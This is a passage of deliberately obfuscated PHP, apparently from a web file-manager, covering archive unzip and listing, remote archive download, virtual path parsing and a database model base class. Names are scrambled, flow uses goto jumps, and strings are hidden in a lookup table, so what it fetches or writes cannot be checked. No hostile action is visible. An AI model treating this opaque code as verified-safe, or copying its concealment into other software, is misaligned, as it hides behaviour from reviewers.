$b´âİĞ²¸‡[$EóÕëÖÆ—¿[28]]; goto eË˜®ª§Ğ¹; bòÎ‘‡„é: if ($Cã²êâô || !$Cï…äò¯‘) { if ($Cï…äò¯‘ && strstr($Cï…äò¯‘, TEMP_FILES)) { $E¨ë™²¨ôã = $EËÂÓ‹´„» = array(); recursion_dir($c„ø ŒŸ¢, $E¨ë™²¨ôã, $EËÂÓ‹´„», 0); foreach ($E¨ë™²¨ôã as $AÇÎŠÀ÷’) { del_dir($AÇÎŠÀ÷’); } foreach ($EËÂÓ‹´„» as $Có¹Ûº—¡‘) { if ($Có¹Ûº—¡‘ == $a—· ¶â) { continue; } del_file($Có¹Ûº—¡‘); } } return $D†Å¾¼¤¦‹; } $dßäÛ² ó = self::pathFather($b´âİĞ²¸‡[$EóÕëÖÆ—¿[75]]); $EùÍª«îÁ¥ = self::move($D†Å¾¼¤¦‹, $dßäÛ² ó, $E¹Ù›®); goto C÷µÊĞô´; C÷µÊĞô´: if (!$EùÍª«îÁ¥) { del_dir($Cï…äò¯‘); show_json(LNG($EóÕëÖÆ—¿[1021]), !1); } del_dir($Cï…äò¯‘); return $EùÍª«îÁ¥; goto f¯õäï‹Ç¬; eË˜®ª§Ğ¹: if (count($EËÂÓ‹´„») > 1) { $cø­Æˆğ¿ = IO::info(IO::pathFather($b´âİĞ²¸‡[$EóÕëÖÆ—¿[75]])); $aÎÕØÏÚº¯ = $cø­Æˆğ¿[$EóÕëÖÆ—¿[28]]; } $c„ø ŒŸ¢ = $Cï…äò¯‘; if (!$c„ø ŒŸ¢) { $c„ø ŒŸ¢ = get_path_father($b´âİĞ²¸‡[$EóÕëÖÆ—¿[75]]); $fÒìçÊ£Ë = IO::info($c„ø ŒŸ¢); if (!$fÒìçÊ£Ë[$EóÕëÖÆ—¿[185]]) { show_json(LNG($EóÕëÖÆ—¿[1020]), !1); } } goto cª´Œ×É Ê; d¦‡è°¥ˆš: $EóÕëÖÆ—¿ =& $_SERVER[Ö¹ñÒÁ²÷]; $E »ØŒí‚ƒ = self::init($cç’ÉÂİô[0][$EóÕëÖÆ—¿[75]]); $b´âİĞ²¸‡ = self::info($cç’ÉÂİô[0][$EóÕëÖÆ—¿[75]]); goto A°°¿«³¼Š; f¯õäï‹Ç¬: } public static function unzip($fÂÕ„ó‚éÇ, $e˜¿™è‚è = "\x72\x65\160\x6c\x61\143\x65") { goto E´´•Áƒ‘; bÃÊå¥í¾Ğ: mk_dir($e… å˜); $F‘ïìŸ®·¿ = self::fileExt($d•ÛÆÓŞœğ); $a­Ÿî…Š’‡ = $e… å˜ . $B§™¯†È„[91] . $F‘ïìŸ®·¿; goto d¿²¼‹®µÃ; E´´•Áƒ‘: $B§™¯†È„ =& $_SERVER[Ö¹ñÒÁ²÷]; $dµ–™ÅÈ¼¨ = $fÂÕ„ó‚éÇ[$B§™¯†È„[75]]; $cÄî©¨òî¶ = $fÂÕ„ó‚éÇ[$B§™¯†È„[1022]]; goto eÊ·–²¢†; a¦æ™‰‘¿: Hook::trigger($B§™¯†È„[1029], $e… å˜); recursion_dir($e… å˜, $díŠß†§›ã, $b©ãÁöİêé, 0); $fİç‘›‘‰º = array_merge($díŠß†§›ã, $b©ãÁöİêé); goto Eì„åãÇˆÔ; eÊ·–²¢†: if (!($d•ÛÆÓŞœğ = parent::info($dµ–™ÅÈ¼¨))) { show_json(LNG($B§™¯†È„[1023]), !1); } if (!($B·…¡¶îÚ× = parent::infoFull($cÄî©¨òî¶))) { $cÄî©¨òî¶ = parent::mkdir($cÄî©¨òî¶); $B·…¡¶îÚ× = array($B§™¯†È„[75] => $cÄî©¨òî¶); } else { if (isset($B·…¡¶îÚ×[$B§™¯†È„[365]]) && trim($B·…¡¶îÚ×[$B§™¯†È„[75]], $B§™¯†È„[8]) != trim($cÄî©¨òî¶, $B§™¯†È„[8])) { $Eßâ’ˆİæä = KodIO::make($B·…¡¶îÚ×[$B§™¯†È„[457]]); $fŠõ¯¶Š = parent::fileNameAuto($Eßâ’ˆİæä, $B·…¡¶îÚ×[$B§™¯†È„[28]], REPEAT_RENAME_FOLDER, !0); $cÄî©¨òî¶ = parent::mkdir($Eßâ’ˆİæä . $fŠõ¯¶Š); $B·…¡¶îÚ× = array($B§™¯†È„[75] => $cÄî©¨òî¶); } } $cÄî©¨òî¶ = $B·…¡¶îÚ×[$B§™¯†È„[75]]; goto eËºä…×­ù; A™®á¶Ø¡: $BÈ«—ğßÉ = KodArchive::extract($a­Ÿî…Š’‡, $e… å˜ . $B§™¯†È„[8], $EÀ„¹ùÊ»); self::archiveExt(); if (!$BÈ«—ğßÉ[$B§™¯†È„[1026]]) { show_json($B§™¯†È„[1027] . $BÈ«—ğßÉ[$B§™¯†È„[1028]], !1); } goto a¦æ™‰‘¿; AÄõØ´¼©: return !0; goto D±ö†Ñæ•; Eì„åãÇˆÔ: foreach ($fİç‘›‘‰º as $e¿³Òã„ß) { $e¿³Òã„ß = self::iconvApp($e¿³Òã„ß); self::move($e¿³Òã„ß, $cÄî©¨òî¶, $e˜¿™è‚è); } del_dir($e… å˜); if (!$d„Û‡çéÊñ) { del_file($a­Ÿî…Š’‡); } goto AÄõØ´¼©; d¿²¼‹®µÃ: if (!@file_exists(self::iconvSystem($a­Ÿî…Š’‡))) { $d„Û‡çéÊñ = self::localFilePath($dµ–™ÅÈ¼¨, $F‘ïìŸ®·¿); $a­Ÿî…Š’‡ = $d„Û‡çéÊñ ? $d„Û‡çéÊñ : parent::download($dµ–™ÅÈ¼¨, $a­Ÿî…Š’‡); } $a­Ÿî…Š’‡ = self::iconvSystem($a­Ÿî…Š’‡); $EÀ„¹ùÊ» = isset($fÂÕ„ó‚éÇ[$B§™¯†È„[1024]]) ? $fÂÕ„ó‚éÇ[$B§™¯†È„[1024]] : $B§™¯†È„[1025]; goto A™®á¶Ø¡; eËºä…×­ù: $e©‰óÚ‹‹„ = self::tmpFileName($d•ÛÆÓŞœğ); $e… å˜ = TEMP_FILES . $e©‰óÚ‹‹„; del_dir($e… å˜); goto bÃÊå¥í¾Ğ; D±ö†Ñæ•: } public static function unzipList($b¯Š–ğÖö) { goto EÉÌŞ ƒå”; eÂâ  ¬Â: $DÙ‹ÖºÈ‡¦ = json_encode($bìÙÍµÈä[$C¨Ñ¹¢õ‰Œ[1028]]); self::setContent($a¾ÉèÏ¶‰Ô, $DÙ‹ÖºÈ‡¦); if (count($bìÙÍµÈä[$C¨Ñ¹¢õ‰Œ[1028]]) >= $d·¨åÕšõ) { show_json(sprintf(LNG($C¨Ñ¹¢õ‰Œ[1032]), count($bìÙÍµÈä[$C¨Ñ¹¢õ‰Œ[1028]])), !1); } goto cÚ…”ƒàîŞ; fØö—°ëÁ: $d·¨åÕšõ = 50000; if (request_url_safe($bäìƒİ¿)) { $BˆœíÓİİá = parse_url_query($bäìƒİ¿); if (!isset($BˆœíÓİİá[$C¨Ñ¹¢õ‰Œ[75]])) { show_json($C¨Ñ¹¢õ‰Œ[1031], !1); } } $B¸ã²íéµ = isset($BˆœíÓİİá) ? $BˆœíÓİİá[$C¨Ñ¹¢õ‰Œ[75]] : $bäìƒİ¿; goto Dª÷¶÷Ã©Å; Dª÷¶÷Ã©Å: $eƒê˜ÖÒÏï = self::info($B¸ã²íéµ); $CöŒíŠé‡¯ = self::fileExt($eƒê˜ÖÒÏï); $Fğ¢„º‡Ä = self::tmpFileName($eƒê˜ÖÒÏï); goto fóïß‡‹§; fî…†Ë†¥: $FÔæçù˜¹ = self::iconvSystem($FÔæçù˜¹); if ($f¥±‘ääÄ >= 0) { $b—å÷Ù”‰„ = isset($b¯Š–ğÖö[$C¨Ñ¹¢õ‰Œ[1034]]) ? $b¯Š–ğÖö[$C¨Ñ¹¢õ‰Œ[1034]] : !1; $eòäÏáè° = isset($b¯Š–ğÖö[$C¨Ñ¹¢õ‰Œ[28]]) ? $b¯Š–ğÖö[$C¨Ñ¹¢õ‰Œ[28]] : $C¨Ñ¹¢õ‰Œ[33]; KodArchive::filePreview($FÔæçù˜¹, $f¥±‘ääÄ, $b—å÷Ù”‰„, $eòäÏáè°); self::archiveExt(); die; } $bìÙÍµÈä = KodArchive::listContent($FÔæçù˜¹); goto d°öªñù‰‚; d°öªñù‰‚: self::archiveExt(); del_dir($Câà•Öš¬); if (!$bìÙÍµÈä[$C¨Ñ¹¢õ‰Œ[1026]]) { show_json($bìÙÍµÈä[$C¨Ñ¹¢õ‰Œ[1028]], !1); } goto eÂâ  ¬Â; EÉÌŞ ƒå”: $C¨Ñ¹¢õ‰Œ =& $_SERVER[Ö¹ñÒÁ²÷]; $bäìƒİ¿ = $b¯Š–ğÖö[$C¨Ñ¹¢õ‰Œ[75]]; $f¥±‘ääÄ = isset($b¯Š–ğÖö[$C¨Ñ¹¢õ‰Œ[1030]]) ? $b¯Š–ğÖö[$C¨Ñ¹¢õ‰Œ[1030]] : -1; goto fØö—°ëÁ; a²‚‹ÒâŒ: if (!is_dir($Câà•Öš¬)) { mk_dir($Câà•Öš¬); } $FÔæçù˜¹ = $Câà•Öš¬ . $C¨Ñ¹¢õ‰Œ[8] . $Fñìµ…ßíØ; if (!@file_exists(self::iconvSystem($FÔæçù˜¹))) { if (isset($BˆœíÓİİá)) { url_request($bäìƒİ¿, $C¨Ñ¹¢õ‰Œ[1033], $FÔæçù˜¹); } else { $BÙ¼£İ»–æ = self::localFilePath($bäìƒİ¿, $CöŒíŠé‡¯); $FÔæçù˜¹ = $BÙ¼£İ»–æ ? $BÙ¼£İ»–æ : self::download($bäìƒİ¿, $FÔæçù˜¹); } } goto fî…†Ë†¥; cÚ…”ƒàîŞ: return $bìÙÍµÈä[$C¨Ñ¹¢õ‰Œ[1028]]; goto b†ÁŸ’ßĞ×; fóïß‡‹§: if (isset($BˆœíÓİİá)) { $aâñÕ¢Úë™ = array($BˆœíÓİİá[$C¨Ñ¹¢õ‰Œ[75]], $BˆœíÓİİá[$C¨Ñ¹¢õ‰Œ[1030]], $BˆœíÓİİá[$C¨Ñ¹¢õ‰Œ[28]]); $Fñìµ…ßíØ = md5(implode($C¨Ñ¹¢õ‰Œ[70], $aâñÕ¢Úë™)) . $C¨Ñ¹¢õ‰Œ[91] . get_path_ext($BˆœíÓİİá[$C¨Ñ¹¢õ‰Œ[28]]); } else { $aâñÕ¢Úë™ = array($eƒê˜ÖÒÏï[$C¨Ñ¹¢õ‰Œ[28]], $eƒê˜ÖÒÏï[$C¨Ñ¹¢õ‰Œ[75]], $eƒê˜ÖÒÏï[$C¨Ñ¹¢õ‰Œ[77]]); $Fñìµ…ßíØ = md5(implode($C¨Ñ¹¢õ‰Œ[70], $aâñÕ¢Úë™)) . $C¨Ñ¹¢õ‰Œ[91] . $CöŒíŠé‡¯; } if ($f¥±‘ääÄ == -1) { $a¾ÉèÏ¶‰Ô = IO_PATH_SYSTEM_TEMP . "\172\x69\x70\126\x69\x65\x77\x2f{$Fğ¢„º‡Ä}\57{$Fñìµ…ßíØ}\56\x6c\x6f\x67"; $a‚ôñƒğ…Ë = self::infoFull($a¾ÉèÏ¶‰Ô); if ($a‚ôñƒğ…Ë) { $a¾ÉèÏ¶‰Ô = $a‚ôñƒğ…Ë[$C¨Ñ¹¢õ‰Œ[75]]; $DÛ‚ğêïƒ = self::getContent($a¾ÉèÏ¶‰Ô); if ($DÛ‚ğêïƒ) { $DÙ‹ÖºÈ‡¦ = json_decode($DÛ‚ğêïƒ, !0); if (count($DÙ‹ÖºÈ‡¦) >= $d·¨åÕšõ) { show_json(sprintf(LNG($C¨Ñ¹¢õ‰Œ[1032]), count($DÙ‹ÖºÈ‡¦)), !1); } return $DÙ‹ÖºÈ‡¦; } } else { $a¾ÉèÏ¶‰Ô = self::mkfile($a¾ÉèÏ¶‰Ô); } } $Câà•Öš¬ = TEMP_FILES . $Fğ¢„º‡Ä; goto a²‚‹ÒâŒ; b†ÁŸ’ßĞ×: } private static function fileExt($fŞùƒ²îĞñ) { $bŠİª‰ÜÛÎ =& $_SERVER[Ö¹ñÒÁ²÷]; $Fè…œœÜ“ = $fŞùƒ²îĞñ[$bŠİª‰ÜÛÎ[156]]; if ($Fè…œœÜ“ == $bŠİª‰ÜÛÎ[1035]) { $eÄŒÃ›ó’² = $bŠİª‰ÜÛÎ[1036]; if (substr($fŞùƒ²îĞñ[$bŠİª‰ÜÛÎ[28]], -strlen($eÄŒÃ›ó’²)) == $eÄŒÃ›ó’²) { $Fè…œœÜ“ = $bŠİª‰ÜÛÎ[1037]; } } self::archiveExt($Fè…œœÜ“); return $Fè…œœÜ“; } private static function zipFileList($Cƒ²‡Õˆ, $a‚¦àÚï§‚ = false) { $cí‡Ç°½ =& $_SERVER[Ö¹ñÒÁ²÷]; $c§ŒÖò = array(); foreach ($Cƒ²‡Õˆ as $eö¢åàÈê) { $f«øÂ“ì¥ = $eö¢åàÈê[$cí‡Ç°½[75]]; if ($a‚¦àÚï§‚) { $f«øÂ“ì¥ = self::copy($eö¢åàÈê[$cí‡Ç°½[75]], $a‚¦àÚï§‚, $cí‡Ç°½[741]); } if ($f«øÂ“ì¥ && self::local()->exist($f«øÂ“ì¥)) { $c§ŒÖò[$eö¢åàÈê[$cí‡Ç°½[75]]] = $f«øÂ“ì¥; } } if (!empty($c§ŒÖò)) { return array_values($c§ŒÖò); } show_json(LNG($cí‡Ç°½[1038]), !1); } public static function tmpFileName($C‰Ìõ‰¤š–) { $CÈ…¹¿Èâí =& $_SERVER[Ö¹ñÒÁ²÷]; $c‰¶ÙÎØ¯ò = array($C‰Ìõ‰¤š–[$CÈ…¹¿Èâí[28]], $C‰Ìõ‰¤š–[$CÈ…¹¿Èâí[75]], $C‰Ìõ‰¤š–[$CÈ…¹¿Èâí[77]], $C‰Ìõ‰¤š–[$CÈ…¹¿Èâí[455]]); return md5(implode($CÈ…¹¿Èâí[70], $c‰¶ÙÎØ¯ò)); } private static function localFilePath($f“°Èô¿†É, $Eˆ’²˜õæ¥) { goto FòğÌñÒÅ; C›äÇå™: if ($CØ¢‡ê¤ == $c¹Œæó•à[101] || $CØ¢‡ê¤ == $c¹Œæó•à[1042]) { if (!$dé„…’â˜›->exist($dé„…’â˜›->path)) { show_json(LNG($c¹Œæó•à[100]), !1); } return $dé„…’â˜›->path; } return !1; goto a«ïŸ‚µÜ ; FòğÌñÒÅ: $c¹Œæó•à =& $_SERVER[Ö¹ñÒÁ²÷]; if ($Eˆ’²˜õæ¥ == $c¹Œæó•à[1039] && strtoupper(substr(PHP_OS, 0, 3)) == $c¹Œæó•à[1040]) { return !1; } $eˆ˜½ÑÆğ½ = KodIO::parse($f“°Èô¿†É); goto BØëŠ‹ÈÎ; BØëŠ‹ÈÎ: if ($eˆ˜½ÑÆğ½[$c¹Œæó•à[29]] == KodIO::KOD_SOURCE) { $f¸áÛ’…è = Model($c¹Œæó•à[749])->fileInfoGet(KodIO::sourceID($f“°Èô¿†É)); if (!$f¸áÛ’…è[$c¹Œæó•à[75]]) { show_json($c¹Œæó•à[1041], !1); } $f“°Èô¿†É = $f¸áÛ’…è[$c¹Œæó•à[75]]; } $dé„…’â˜› = self::init($f“°Èô¿†É); $CØ¢‡ê¤ = $dé„…’â˜›->getType(); goto C›äÇå™; a«ïŸ‚µÜ : } private static function archiveExt($a„ñ¹™™ö· = '') { $GLOBALS[$_SERVER[Ö¹ñÒÁ²÷][1043]] = $a„ñ¹™™ö·; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\x75\162\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\165\163\145\162\x52\x65\x63\171\143\154\145\x7d"; const KOD_USER_FAV = "\x7b\x75\163\145\x72\x46\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\163\x65\x72\106\x69\154\x65\124\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\145\162\x46\151\x6c\145\124\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\165\x70\122\x6f\x6f\x74\123\x65\154\146\x7d"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\162\123\150\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\163\x65\x72\x53\150\141\162\145\x4c\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\x72\145\124\157\115\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\x61\162\145\111\164\145\x6d\175"; const KOD_SHARE_LINK = "\x7b\x73\x68\x61\162\145\x49\164\x65\155\x4c\x69\156\x6b\175"; const KOD_SEARCH = "\x7b\163\145\x61\162\143\150\175"; const KOD_BLOCK = "\173\142\x6c\157\x63\x6b\x7d"; const KOD_IO = "\173\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\x75\163\145\x72\122\145\x6e\x63\145\x6e\164\175"; const KOD_USER_DRIVER = "\x7b\x64\162\151\x76\x65\x72\175"; public static function typeList() { $aãäõİ¨ë° =& $_SERVER[Ö¹ñÒÁ²÷]; return array($aãäõİ¨ë°[1044] => self::KOD_SOURCE, $aãäõİ¨ë°[1045] => self::KOD_USER_RECYCLE, $aãäõİ¨ë°[1046] => self::KOD_USER_FAV, $aãäõİ¨ë°[1047] => self::KOD_USER_FILE_TAG, $aãäõİ¨ë°[1048] => self::KOD_USER_FILE_TYPE, $aãäõİ¨ë°[1049] => self::KOD_GROUP_ROOT_SELF, $aãäõİ¨ë°[1050] => self::KOD_USER_SHARE, $aãäõİ¨ë°[1051] => self::KOD_USER_SHARE_LINK, $aãäõİ¨ë°[1052] => self::KOD_USER_SHARE_TO_ME, $aãäõİ¨ë°[1053] => self::KOD_SHARE_ITEM, $aãäõİ¨ë°[1054] => self::KOD_SHARE_LINK, $aãäõİ¨ë°[1055] => self::KOD_SEARCH, $aãäõİ¨ë°[1056] => self::KOD_BLOCK, $aãäõİ¨ë°[1057] => self::KOD_IO, $aãäõİ¨ë°[1058] => self::KOD_USER_RECENT, $aãäõİ¨ë°[1059] => self::KOD_USER_DRIVER); } public static function parse($A¿ÑÛ¦ÌÙÛ) { goto a¡í›ø“; a¡í›ø“: $F„Œ×²Ú· =& $_SERVER[Ö¹ñÒÁ²÷]; $A¿ÑÛ¦ÌÙÛ = self::clear($A¿ÑÛ¦ÌÙÛ); $dîÉ×²ºÚß = array_values(self::typeList()); goto eÚœ—íçŠ–; E¬ê„ößÈ–: $E®¿·ë‚ì = array($F„Œ×²Ú·[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $FÛİÂ¯ƒº[$F„Œ×²Ú·[1064]] = in_array($FÛİÂ¯ƒº[$F„Œ×²Ú·[29]], $E®¿·ë‚ì); return $FÛİÂ¯ƒº; goto e¼ˆËĞ³Ä’; eÚœ—íçŠ–: preg_match($F„Œ×²Ú·[1060], $A¿ÑÛ¦ÌÙÛ, $fŸêŠ™ÙÓò); $FÛİÂ¯ƒº = array($F„Œ×²Ú·[384] => !1, $F„Œ×²Ú·[1061] => !1, $F„Œ×²Ú·[381] => !1, $F„Œ×²Ú·[75] => $A¿ÑÛ¦ÌÙÛ, $F„Œ×²Ú·[1006] => !1, $F„Œ×²Ú·[1005] => $F„Œ×²Ú·[33]); if (is_array($fŸêŠ™ÙÓò) && count($fŸêŠ™ÙÓò) == 5) { $C¥ãƒ‘”¹³ = $F„Œ×²Ú·[1062] . $fŸêŠ™ÙÓò[2] . $F„Œ×²Ú·[311]; if (in_array($C¥ãƒ‘”¹³, $dîÉ×²ºÚß)) { $FÛİÂ¯ƒº[$F„Œ×²Ú·[1006]] = $fŸêŠ™ÙÓò[1]; $FÛİÂ¯ƒº[$F„Œ×²Ú·[29]] = $C¥ãƒ‘”¹³; $FÛİÂ¯ƒº[$F„Œ×²Ú·[1063]] = substr($C¥ãƒ‘”¹³, 1, -1); $FÛİÂ¯ƒº[$F„Œ×²Ú·[363]] = $fŸêŠ™ÙÓò[3]; } $FÛİÂ¯ƒº[$F„Œ×²Ú·[1005]] = $fŸêŠ™ÙÓò[4]; } goto E¬ê„ößÈ–; e¼ˆËĞ³Ä’: } public static function clear($b¿š’Œ¾À) { goto a³ŒÉŠÅğ¥; a³ŒÉŠÅğ¥: $eŸÔŒ÷Ë‰… =& $_SERVER[Ö¹ñÒÁ²÷]; $b¿š’Œ¾À = str_replace($eŸÔŒ÷Ë‰…[93], $eŸÔŒ÷Ë‰…[8], $b¿š’Œ¾À); $bƒ•£ãº‹ = $eŸÔŒ÷Ë‰…[1065]; goto f‚ù˜ÇéÛ; cƒØ‰¼Â…Û: if ($b¿š’Œ¾À == $eŸÔŒ÷Ë‰…[8]) { return $eŸÔŒ÷Ë‰…[8]; } $b¿š’Œ¾À = rtrim($b¿š’Œ¾À, $eŸÔŒ÷Ë‰…[8]); return $b¿š’Œ¾À; goto fÃ‹·‡Î‰Æ; f‚ù˜ÇéÛ: if (substr($b¿š’Œ¾À, 0, 3) == $eŸÔŒ÷Ë‰…[1066]) { $b¿š’Œ¾À = substr($b¿š’Œ¾À, 3); } while (strstr($b¿š’Œ¾À, $bƒ•£ãº‹)) { $b¿š’Œ¾À = str_replace($bƒ•£ãº‹, $eŸÔŒ÷Ë‰…[8], $b¿š’Œ¾À); } $b¿š’Œ¾À = preg_replace($eŸÔŒ÷Ë‰…[1067], $eŸÔŒ÷Ë‰…[8], $b¿š’Œ¾À); goto cƒØ‰¼Â…Û; fÃ‹·‡Î‰Æ: } public static function sourceID($bç­•æÎ×) { $fÛ×­š„Ãã =& $_SERVER[Ö¹ñÒÁ²÷]; $eŞ»ŒÀå°Š = self::parse($bç­•æÎ×); if ($eŞ»ŒÀå°Š[$fÛ×­š„Ãã[29]] !== self::KOD_SOURCE) { show_json(LNG($fÛ×­š„Ãã[1068]), !1); } return $eŞ»ŒÀå°Š[$fÛ×­š„Ãã[363]]; } public static function make($d¸«¢®µ‘¢) { if (!$d¸«¢®µ‘¢) { return !1; } return self::makePath(self::KOD_SOURCE, intval($d¸«¢®µ‘¢)); } public static function makeShare($f™á’œ¢ˆ¿, $Eâ¡É÷ùâÁ) { return self::makePath(self::KOD_SHARE_ITEM, $f™á’œ¢ˆ¿, $Eâ¡É÷ùâÁ); } public static function makeFileTypePath($EÂ¯ØùÜ…¹) { return self::makePath(self::KOD_USER_FILE_TYPE, $EÂ¯ØùÜ…¹); } public static function makeFileTagPath($CÜÔŞˆ»Û) { return self::makePath(self::KOD_USER_FILE_TAG, $CÜÔŞˆ»Û); } public static function makePath($bÃšà°Ò©©, $BÕ‰Õ–šëİ = '', $DØÓ“ÂÓí¿ = '') { $A¢±ÒšÊå =& $_SERVER[Ö¹ñÒÁ²÷]; $fï¼òù½çØ = substr($bÃšà°Ò©©, 1, -1); $FÏ½í±Í©Œ = $A¢±ÒšÊå[1069] . $fï¼òù½çØ . $A¢±ÒšÊå[1070] . $BÕ‰Õ–šëİ . $A¢±ÒšÊå[1071]; $FÏ½í±Í©Œ = $DØÓ“ÂÓí¿ ? $FÏ½í±Í©Œ . $DØÓ“ÂÓí¿ . $A¢±ÒšÊå[8] : $FÏ½í±Í©Œ; return $FÏ½í±Í©Œ; } public static function hashPath($F¿½÷šäŞ) { $c‡„š˜˜ =& $_SERVER[Ö¹ñÒÁ²÷]; $BÉ‰‡¹ÃŠÚ = is_array($F¿½÷šäŞ) ? $F¿½÷šäŞ : IO::info($F¿½÷šäŞ); $c¬êø—È = _get($BÉ‰‡¹ÃŠÚ, $c‡„š˜˜[1072], $c‡„š˜˜[33]); if (!$c¬êø—È) { $D ã‰±í´ø = KodIO::parse($BÉ‰‡¹ÃŠÚ[$c‡„š˜˜[75]]); if (!$D ã‰±í´ø[$c‡„š˜˜[29]]) { $c¬êø—È = IO::hashSimple($BÉ‰‡¹ÃŠÚ[$c‡„š˜˜[75]]); } } if (!$c¬êø—È) { $c¬êø—È = md5($BÉ‰‡¹ÃŠÚ[$c‡„š˜˜[75]] . $BÉ‰‡¹ÃŠÚ[$c‡„š˜˜[77]] . $BÉ‰‡¹ÃŠÚ[$c‡„š˜˜[106]]); } return $c¬êø—È; } public static function initSystemPath() { $bİÂ¡áÜï =& $_SERVER[Ö¹ñÒÁ²÷]; if (defined($bİÂ¡áÜï[1073])) { return; } define($bİÂ¡áÜï[1073], self::systemPath($bİÂ¡áÜï[1074])); define($bİÂ¡áÜï[1075], self::systemPath($bİÂ¡áÜï[1076])); define($bİÂ¡áÜï[1077], self::systemPath($bİÂ¡áÜï[1078])); define($bİÂ¡áÜï[1079], self::systemPath($bİÂ¡áÜï[1080])); } private static function systemPath($Cå×¶¦–Â¡) { goto aÍƒöÏŸÎ”; F— Õ ¨è¾: if ($cœã½¶¿‰) { return $cœã½¶¿‰; } if ($Cå×¶¦–Â¡ == $f—ğ¯ÑÅâ¼[1074]) { $cœã½¶¿‰ = self::make(Model($f—ğ¯ÑÅâ¼[749])->systemRootPathAdd($f—ğ¯ÑÅâ¼[1083])); } else { $cœã½¶¿‰ = self::systemPath($f—ğ¯ÑÅâ¼[1074]); $Añ¤¢‰¬‡œ = self::sourceID($cœã½¶¿‰); $cœã½¶¿‰ = self::make(Model($f—ğ¯ÑÅâ¼[749])->mkdir($Añ¤¢‰¬‡œ, $Cå×¶¦–Â¡)); } Model($f—ğ¯ÑÅâ¼[1082])->set($B‡ÈÑŒ«Á, $cœã½¶¿‰); goto fàó˜–ˆ; fàó˜–ˆ: return $cœã½¶¿‰; goto d¶Œ©‚¹ùŒ; aÍƒöÏŸÎ”: $f—ğ¯ÑÅâ¼ =& $_SERVER[Ö¹ñÒÁ²÷]; $B‡ÈÑŒ«Á = $f—ğ¯ÑÅâ¼[1081] . ucfirst($Cå×¶¦–Â¡); $cœã½¶¿‰ = Model($f—ğ¯ÑÅâ¼[1082])->get($B‡ÈÑŒ«Á); goto F— Õ ¨è¾; d¶Œ©‚¹ùŒ: } public static function systemFolder($F¢ˆ‹ñ¾ïÇ) { $FêèÚßİÔË = IO_PATH_SYSTEM_SOURCE . $F¢ˆ‹ñ¾ïÇ; $a‘ÛÉ§Íö¸ = Cache::get($FêèÚßİÔË); if (!$a‘ÛÉ§Íö¸) { $f››Ñ¶Õˆõ = IO::infoFull($FêèÚßİÔË); if (!$f››Ñ¶Õˆõ) { $a‘ÛÉ§Íö¸ = IO::mkdir($FêèÚßİÔË, REPEAT_SKIP); } else { $a‘ÛÉ§Íö¸ = $f››Ñ¶Õˆõ[$_SERVER[Ö¹ñÒÁ²÷][75]]; } Cache::set($FêèÚßİÔË, $a‘ÛÉ§Íö¸, 3600 * 10); } return $a‘ÛÉ§Íö¸; } public static function defaultDriver() { return Model($_SERVER[Ö¹ñÒÁ²÷][701])->defaultDriver(); } public static function defaultIO() { $B´„ëßˆ´ =& $_SERVER[Ö¹ñÒÁ²÷]; $c÷¢˜¥«Œ = self::defaultDriver(); return $B´„ëßˆ´[1084] . $c÷¢˜¥«Œ[$B´„ëßˆ´[363]] . $B´„ëßˆ´[1071]; } public static function fileTypeList() { $d÷Ü¶ˆƒØÖ =& $_SERVER[Ö¹ñÒÁ²÷]; $eš¦‰Ù¢Ï÷ = $GLOBALS[$d÷Ü¶ˆƒØÖ[6]][$d÷Ü¶ˆƒØÖ[1085]]; foreach ($eš¦‰Ù¢Ï÷ as $a–ÓŒŞ×ğ× => $a¥­ò„ÓØÀ) { $dÎ…¿ ã¬„ = $d÷Ü¶ˆƒØÖ[1086] . $a–ÓŒŞ×ğ×; $cÇÉíê¼ = LNG($dÎ…¿ ã¬„); if ($dÎ…¿ ã¬„ != $cÇÉíê¼) { $eš¦‰Ù¢Ï÷[$a–ÓŒŞ×ğ×][$d÷Ü¶ˆƒØÖ[28]] = $cÇÉíê¼; } } return $eš¦‰Ù¢Ï÷; } } goto CíÎÀÇŒ»ƒ; e‘ª‡šğöê: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\146\x79\x54\x69\155\145", "\x74\x69\x6d\145", "\x69\x6e\x73\x65\x72\164\54\165\x70\x64\x61\164\x65", "\146\x75\x6e\x63\164\x69\157\156"), array("\x63\x72\x65\x61\164\x65\124\x69\155\x65", "\x74\151\x6d\x65", "\151\x6e\x73\x65\x72\x74", "\x66\165\156\x63\x74\x69\x6f\156")); public function setDataAuto($cšÜ´ÂŞÀÈ) { $this->dataAuto = $cšÜ´ÂŞÀÈ; } public function __construct($c›ø•á•‡ = '', $FÓ¨ñ•…Ó– = '', $dŒ°ä‰Êëç = '') { parent::__construct($c›ø•á•‡, $FÓ¨ñ•…Ó–, $dŒ°ä‰Êëç); } public static function textEncode($BŠª»„¡Ä¾) { if (!$BŠª»„¡Ä¾) { return $BŠª»„¡Ä¾; } $b»ÍŞÕĞ‚» = json_encode($BŠª»„¡Ä¾); $b»ÍŞÕĞ‚» = preg_replace_callback($_SERVER[Ö¹ñÒÁ²÷][338], function ($b÷Ôº‹‰) { return addslashes($b÷Ôº‹‰[0]); }, $b»ÍŞÕĞ‚»); return json_decode($b»ÍŞÕĞ‚»); } public static function textDecode($B›‰Ç¦‚Ëó) { $ağ†‘°£°Ñ =& $_SERVER[Ö¹ñÒÁ²÷]; $eªíô„ê° = json_encode($B›‰Ç¦‚Ëó); $eªíô„ê° = preg_replace_callback($ağ†‘°£°Ñ[339], function ($fÊÔˆ“Óñ) { return $_SERVER[Ö¹ñÒÁ²÷][93]; }, $eªíô„ê°); return json_decode($eªíô„ê°); } protected $tableMeta = array(); protected function _beforeInsert(&$BëÎ³à³È®, $C¦Øºğ³») { $fø‘·‹Îé† =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$this->checkDataAutoHas($fø‘·‹Îé†[340])) { return; } 